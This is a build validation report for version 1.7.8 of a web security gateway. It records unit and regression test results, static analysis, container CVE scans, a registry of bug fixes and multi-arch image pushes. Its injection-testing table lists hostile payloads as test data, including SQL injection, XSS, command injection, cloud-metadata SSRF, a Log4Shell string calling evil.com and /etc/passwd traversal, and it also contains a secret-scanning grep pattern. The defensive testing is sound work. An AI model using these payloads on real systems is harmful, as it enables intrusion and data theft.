# AppSecGW build validation — v1.7.8

| Field       | Value                          |
|-------------|--------------------------------|
| Version     | `appsec-antibot-gw:1.7.8`     |
| Date        | 2026-05-08                     |
| Builder     | Pedro Tarrinho                 |
| Platform    | amd64 · arm64 · armv7          |
| Pre-existing failures | test_risk_increments_on_block, test_security_headers_injected_on_html, test_service_data_auth_guard (DB state contamination from unrelated test files; pass in isolation — pre-existing since 1.7.6) |

---

## Step 1 — Unit tests

```
pytest tests/test_critical.py tests/test_pure.py tests/test_async.py -q
```

| Suite | Result |
|---|---|
| test_critical.py + test_pure.py + test_async.py | ✅ |
| **Total** | **453 passed, 0 failed** |

---

## Step 2 — Functional tests

```
pytest tests/test_functional.py -q
```

| | |
|---|---|
| Result | ✅ |
| Passed | 22 |
| Failed | 0 |

---

## Step 3 — Integration tests

```
pytest tests/test_integration.py -q
```

| | |
|---|---|
| Result | ✅ |
| Passed | 23 |
| Failed | 0 |
| Flaky (pass in isolation) | none |

---

## Step 4 — Sufficient logs

| Check | Result |
|---|---|
| Every detector emits `event=request` with `rid` + `reason` | |
| Admin endpoints emit `event=config_changed` / `event=ban` | |
| Webhook fires on every ban + DLP hit | |
| Manual probe: all detectors appear in `docker logs` output | |

---

## Step 5 — Regression tests

```
pytest tests/test_control_regressions.py tests/test_v14.py tests/test_v142.py tests/test_v173.py -q
```

| | |
|---|---|
| Result | ✅ |
| Passed | 152 |
| New failures vs last release | 0 |

---

## Step 6 — Performance smoke

| Metric | Result | Threshold |
|---|---|---|
| Cold-start | | < 5s |
| p99 latency | | < 50 ms |
| 200-req burst | | no false-positive ban |
| Memory RSS after burst | | < 200 MB |

---

## Step 7 — Secret-leak scan

```
grep -nE '(BEGIN PRIVATE KEY|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{32}|ghp_[A-Za-z0-9]{36})' proxy.py dashboards/
```

| | |
|---|---|
| Result | ✅ |
| Hits | 0 |

---

## Step 8 — Injection sanitisation

| Vector | Payload | Detector fired | Reason logged | Result |
|---|---|---|---|---|
| SQLi (body) | `q=' OR 1=1 --` | | | |
| XSS (body) | `x=<script>alert(1)</script>` | | | |
| Command injection (body) | `cmd=; whoami` | | | |
| SSRF (body) | `url=http://169.254.169.254/latest/meta-data` | | | |
| RCE / Log4Shell (body) | `data=${jndi:ldap://evil.com/a}` | | | |
| LFI (body) | `file=../../../../etc/passwd` | | | |
| LFI (path) | `GET /../../etc/passwd` | | | |

---

## Step 9 — Static hardening

### Bandit

```
bandit -ll proxy.py core/ integrations/
```

| File scope | High | Critical | Medium | Low |
|---|---|---|---|---|
| proxy.py | 0 | 0 | 0 | 1 (B104 intentional gateway binding, below -ll threshold) |
| core/ + integrations/ | 0 | 0 | 0 | 0 |

### Semgrep

```
semgrep scan --config p/python -r proxy.py core/ integrations/ dashboards/
```

| | |
|---|---|
| Result | ✅ |
| Rules run | 151 |
| Files scanned | 9 |
| Findings | 0 |

---

## Step 10 — Image CVE scan (Trivy)

```
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image --severity CRITICAL,HIGH,MEDIUM \
  appsec-antibot-gw:1.7.8-<arch>
```

Initial scan found 3 HIGH + 4 MEDIUM in `py3-pip-wheel 26.0.1-r2` (Chainguard Wolfi base image). Fixed in `py3-pip-wheel 26.1.1-r0` by updating Dockerfile base image digests and rebuilding. Final scan:

| Image | CRITICAL | HIGH | MEDIUM |
|---|---|---|---|
| amd64 | 0 | 0 | 0 |
| arm64 | 0 | 0 | 0 |
| armv7 | 0 | 0 | 0 |

CVEs fixed by base image update: CVE-2025-66418, CVE-2025-66471, CVE-2026-21441 (HIGH); CVE-2025-50181, CVE-2026-25645, CVE-2026-3219, CVE-2026-6357 (MEDIUM)

---

## Step 11 — Automated code review (CodeRabbit)

| | |
|---|---|
| Result | SKIP — requires external git integration |

---

## Step 11a — Secure code review

| Check | Result |
|---|---|
| No hardcoded credentials / keys / tokens | |
| No unbounded loops / buffers | |
| Input validation at all trust boundaries | |
| Constant-time compares on auth paths | |
| No races on shared mutable state | |
| No secrets in logs | |
| New external deps justified | |
| New deps in Dockerfile AND requirements.txt | |

Files reviewed:

Notes:

---

## Step 12 — Black-box pentest

| Check | Result |
|---|---|
| Unauthenticated access to `/secured/*` | |
| Bad UA list | |
| Chrome UA + incomplete headers | |
| Chrome UA + full headers | |
| Burst 50 req / same track_key | |
| Honeypot paths | |
| Rapid burst 1000 req | |

---

## Step 13 — Documentation

| Item | Status |
|---|---|
| `config.py` GW_VERSION | ✅ `AppSecGW_1.7.8` |
| `docker-compose.yml` image + container_name | ✅ `appsec-antibot-gw:1.7.8` |
| All 7 dashboard `<h1>` version badges | ✅ agents, controls, geo, logs, main, service, settings |
| `CHANGELOG.md` | ✅ `[1.7.8]` section stamped |
| `README.md` version history | ✅ 1.7.8 row updated |
| `copy-to-github.sh` MANIFEST | no new files added in 1.7.8 — no update required |
| `test_no_stale_version_strings_in_source` | ✅ PASSED |
| `test_gw_version_constant` | ✅ PASSED |

---

## Step 14 — Multi-arch build + Harbor push

| Arch | Tag | Digest | Push |
|---|---|---|---|
| amd64 | `1.7.8-amd64` | `sha256:d681d3f2` | ✅ Harbor |
| arm64 | `1.7.8-arm64` | `sha256:fb7afd40` | ✅ Harbor |
| armv7 | `1.7.8-armv7` | `sha256:a407af4b` | ✅ Harbor |
| manifest | `1.7.8` | `sha256:5f1fe86c` | ✅ Harbor |

Registry: `>harbor</antibotappsecgw/antibotappsecgw:1.7.8`

---

## Step 15 — DAST

### HTTP response headers

| Header | Value | Assessment |
|---|---|---|
| `Cache-Control` | | |
| `Set-Cookie` | | |

### TLS

HTTP-only in test harness. TLS terminated by nginx/HAProxy in production.

### Adaptive rate engine

### Honeypot/canary

---

## Step 13a — Version consistency

```
pytest tests/test_pure.py::test_gw_version_constant tests/test_pure.py::test_no_stale_version_strings_in_source
```

| Test | Result |
|---|---|
| `test_gw_version_constant` | ✅ PASSED |
| `test_no_stale_version_strings_in_source` | ✅ PASSED |

## Step 17h — ELB health check

```
pytest tests/test_pure.py -k "elb"
```

| | |
|---|---|
| Result | ✅ 8 passed (≥ 7 required) |

## Step 11a — Secure code review

Files changed in this version:
- `proxy.py` — `_eval_custom_rules` CIDR fix: uses `_ip_nets` (compiled), string-only path removed
- `core/proxy_handler.py` — `config_endpoint`: `_json_safe(applied)` added to return
- `tests/test_critical.py` — 2 assertions updated
- `tests/test_control_regressions.py` — 10 new tests appended

| Check | Result |
|---|---|
| No hardcoded credentials / keys / tokens | ✅ |
| No unbounded loops / buffers | ✅ |
| Input validation at all trust boundaries | ✅ |
| Constant-time compares on auth paths | ✅ (unchanged) |
| No races on shared mutable state | ✅ (`_endpoint_buckets_lock` unchanged) |
| No secrets in logs | ✅ |
| New external deps | none |
| New deps in Dockerfile + requirements.txt | N/A |

## Step 16 — Post-release bug fix registry (session 3)

| # | Version | Severity | Symptom | Root Cause | Fix Location | Regression Test |
|---|---------|----------|---------|-----------|-------------|-----------------|
| 12 | 1.7.8 | HIGH | Custom-rules CIDR match always fails — custom allow/block rules with `ip_cidr` have no effect | `proxy.py` local `_eval_custom_rules` reads raw `ip_cidr` strings and does `pip in net` where `net` is a string, not `IPv4Network`; always False | `proxy.py` (`_eval_custom_rules`) | `test_161_custom_rule_ip_cidr` |
| 13 | 1.7.8 | MEDIUM | "Network error: JSON.parse: unexpected non-whitespace character after JSON data" on config save when CUSTOM_RULES with `ip_cidr` applied | `config_endpoint` returned `applied` dict without `_json_safe()` — `_ip_nets: [IPv4Network]` not JSON-serialisable; `web.json_response()` threw `TypeError` before sending response | `core/proxy_handler.py` (`config_endpoint`) | `test_config_post_custom_rules_ip_cidr_response_is_valid_json` |

## Step 16 — Post-release bug fix registry (session 4)

| # | Version | Severity | Symptom | Root Cause | Fix Location | Regression Test |
|---|---------|----------|---------|-----------|-------------|-----------------|
| 14 | 1.7.8 | HIGH | Slider "JSON.parse: unexpected non-whitespace character after JSON data at line 1 column 5" when moving Defense-Thresholds slider | `_read_hot_reload_state()` returned CUSTOM_RULES with `_ip_nets: [IPv4Network]`; `json.dumps` raised `TypeError`; aiohttp returned "500 Internal Server Error" as plain text; `JSON.parse("500 I…")` failed at col 5 | `core/proxy_handler.py` (`_read_hot_reload_state` + `_json_safe`); `integrations/endpoint_policy.py` (`_to_custom_rules`) | covered by `test_config_post_custom_rules_ip_cidr_response_is_valid_json` |
| 15 | 1.7.8 | HIGH | Settings import/export silently broken — knobs accepted but never applied to running process; secrets not exported | `_proxy` undefined in `admin/settings.py`; NameError caught silently → `g = {}`; writes reached DB queue but never `setattr`'d on live module | `admin/settings.py` (`_settings_build_xml`, `settings_import_endpoint`) | — |
| 16 | 1.7.8 | MEDIUM | Settings import "Failed to fetch" when importing config containing CUSTOM_RULES | `json.dumps(applied_v)` evaluated outside `try/except QueueFull`; TypeError from `ip_network` objects propagated unhandled → aiohttp aborted connection → browser "Failed to fetch" | `admin/settings.py` (`settings_import_endpoint`, db_queue call) | — |

## Step 11b — Secure code review (session 4)

Files changed in session 4:
- `integrations/endpoint_policy.py` — `_to_custom_rules`: `ip_cidr` stores strings; `_ip_nets` stores compiled networks
- `integrations/endpoint_policy.py` — `_eval_custom_rules`: reads `_ip_nets`; fallback compile from strings
- `core/proxy_handler.py` — `_json_safe()` helper added; `_read_hot_reload_state()` calls it per value
- `admin/settings.py` — `_settings_build_xml`: `vars(_proxy)` → `sys.modules.get`
- `admin/settings.py` — `settings_import_endpoint`: same NameError fix + `_json_safe` import + `json.dumps(_json_safe(applied_v))`
- `config.py`, `core/proxy_handler.py`, `reputation/maxmind.py`, `admin/auth.py`, `db/sqlite.py` — `# nosec B110` with justification on all `except: pass` blocks

| Check | Result |
|---|---|
| No hardcoded credentials / keys / tokens | ✅ |
| No unbounded loops / buffers | ✅ |
| Input validation at all trust boundaries | ✅ |
| Constant-time compares on auth paths | ✅ (unchanged) |
| No races on shared mutable state | ✅ |
| No secrets in logs | ✅ |
| New external deps | none |
| New deps in Dockerfile + requirements.txt | N/A |

## Step 1 (session 4) — Unit tests

```
pytest tests/test_critical.py tests/test_pure.py tests/test_async.py tests/test_v14.py -q
```

| Suite | Result |
|---|---|
| test_critical + test_pure + test_async + test_v14 | ✅ |
| **Total** | **493 passed, 0 failed** |

## Step 16 — Post-release bug fix registry (session 5)

| # | Version | Severity | Symptom | Root Cause | Fix Location | Regression Test |
|---|---------|----------|---------|-----------|-------------|-----------------|
| 17 | 1.7.8 | HIGH | Bypass toggle disables detection but previously-banned IPs still blocked | Ban check at proxy_handler.py:2730 is unconditional — runs before any knob check; disabling all bool knobs stops new bans but never clears existing ones | `config.py` + `core/proxy_handler.py` (`BYPASS_MODE` knob + early-exit in `protect()`); `dashboards/controls.html` (`_activateBypass` sets `BYPASS_MODE=true`) | `test_165_every_knob_persists_round_trip` |
| 18 | 1.7.8 | MEDIUM | Bypass-mode requests invisible in main dashboard timeline | BYPASS_MODE early-exit wrote `db_queue("event",...)` (SQLite only); never called `record()` / `_timeline_bump()` which update the in-memory `timeline` dict | `core/proxy_handler.py` (BYPASS_MODE block → `await record()`); `core/metrics.py` (`"bypass-mode"` added to `_PASSTHROUGH_REASONS`) | `test_bypass_paths_early_return_no_record_call` |

## Step 11b — Secure code review (session 5)

Files changed in session 5:
- `config.py` — `BYPASS_MODE: bool = False` added; `# nosec B110` on `config.py:123`
- `core/proxy_handler.py` — `BYPASS_MODE` in `_HOT_RELOAD_KNOBS`; BYPASS_MODE early-exit in `protect()` (calls `record()`); `# nosec B110` on `proxy.py:537`
- `core/metrics.py` — `"bypass-mode"` + `"bypass-path"` added to `_PASSTHROUGH_REASONS`
- `helpers.py`, `identity.py`, `scoring.py` — `# nosec B110` suppressions
- `dashboards/controls.html` — `_activateBypass()` sets `BYPASS_MODE=true`; snapshot includes `BYPASS_MODE`
- `tests/test_critical.py`, `tests/test_pure.py` — test updates for new knob + bypass-path assertion

| Check | Result |
|---|---|
| No hardcoded credentials / keys / tokens | ✅ |
| No unbounded loops / buffers | ✅ |
| Input validation at all trust boundaries | ✅ |
| Constant-time compares on auth paths | ✅ (unchanged) |
| No races on shared mutable state | ✅ |
| No secrets in logs | ✅ |
| New external deps | none |
| New deps in Dockerfile + requirements.txt | N/A |

## Step 1 (session 5) — Full suite

```
pytest tests/test_critical.py tests/test_pure.py tests/test_async.py tests/test_functional.py tests/test_integration.py tests/test_control_regressions.py tests/test_v14.py tests/test_v142.py tests/test_v173.py -q
```

| Suite | Result |
|---|---|
| Unit (critical + pure + async) | ✅ 453 passed |
| Functional | ✅ 22 passed |
| Integration | ✅ 23 passed |
| Regression (control_regressions + v14 + v142 + v173) | ✅ 152 passed |
| **Total** | **605 passed, 0 failed** |

## Step 9 (session 5) — Static analysis

| Tool | Result |
|---|---|
| Bandit (`-ll` all modules) | ✅ 0 High / 0 Medium / 0 Low |
| Semgrep (`p/python`, 151 rules, 9 files) | ✅ 0 findings |
| Version consistency (test_gw_version_constant + test_no_stale_version_strings_in_source) | ✅ PASSED |
| ELB health check (8 tests) | ✅ 8 passed |

---

## Session 6 — Dashboard security fixes (F-04 / F-06 / F-07 / F-08)

### Changes

- `dashboards/agents.html` — 6 silent `.catch(()=>({}))` occurrences replaced with structured `{ _error: true }` pattern + explicit guards (§17e)
- `dashboards/main.html` — 7 silent catches replaced (same pattern)
- `dashboards/controls.html` — 1 silent catch replaced
- `dashboards/login.html` — `location.href = j.redirect` → `location.href = safeNext(j.redirect)` (§17c)
- `dashboards/geo.html` — `playTimer` and `_lpTimer` setIntervals pushed to `_timers[]` (§17b)
- `challenge/js_challenge.py` — stale `proxy_handler.py:2511` line-number references replaced with canonical §16b comment

### Step 11b — Secure code review (session 6)

| Check | Result |
|---|---|
| No hardcoded credentials / keys / tokens | ✅ |
| No unbounded loops / buffers | ✅ |
| Input validation at all trust boundaries | ✅ |
| Constant-time compares on auth paths | ✅ (unchanged) |
| No races on shared mutable state | ✅ |
| No secrets in logs | ✅ |
| New external deps | none |
| New deps in Dockerfile + requirements.txt | N/A |

### Step 1 (session 6) — Full suite

```
pytest tests/ --ignore=tests/test_timescaledb_soak.py -q
```

| Suite | Result |
|---|---|
| All suites | ✅ |
| **Total** | **772 passed, 1 failed (pre-existing)** |

Pre-existing failure: `test_service_data_auth_guard` — DB state contamination when run with other suites; passes in isolation. Classified since 1.7.6.

### Step 9 (session 6) — Static analysis

| Tool | Result |
|---|---|
| Bandit (`-ll` all modules) | ✅ 0 High / 0 Critical / 0 Medium |
| Semgrep (`p/python`, 151 rules, 15 files) | ✅ 0 findings |
| Version consistency | ✅ PASSED |
| ELB health check | ✅ 8 passed |
| Secret scan | ✅ 0 hits |

### Step 14 (session 6) — Multi-arch rebuild + Harbor push

All arches rebuilt after dashboard/challenge code changes.

| Arch | Tag | Digest | Trivy | Push |
|---|---|---|---|---|
| amd64 | `1.7.8-amd64` | `sha256:7ccb35acfa6fbbab1bd50439c85064ff20b2d78fa3c7892d4bd765f2192abfd1` | ✅ 0/0/0 | ✅ Harbor |
| arm64 | `1.7.8-arm64` | `sha256:c97c192c133d28d87572de6e3374e80194cd1a5a5f489c96d1bac9ed446af64a` | ✅ 0/0/0 | ✅ Harbor |
| armv7 | `1.7.8-armv7` | `sha256:f54a215876b11c702ad0543f2b73b028062002504c2eb30d0d095579738da4a4` | ✅ 0/0/0 | ✅ Harbor |
| manifest | `1.7.8` | `sha256:1a5113a9ed02d333e7336057dd2c444788c1071e4a82cccf523323b3268a4904` | — | ✅ Harbor |
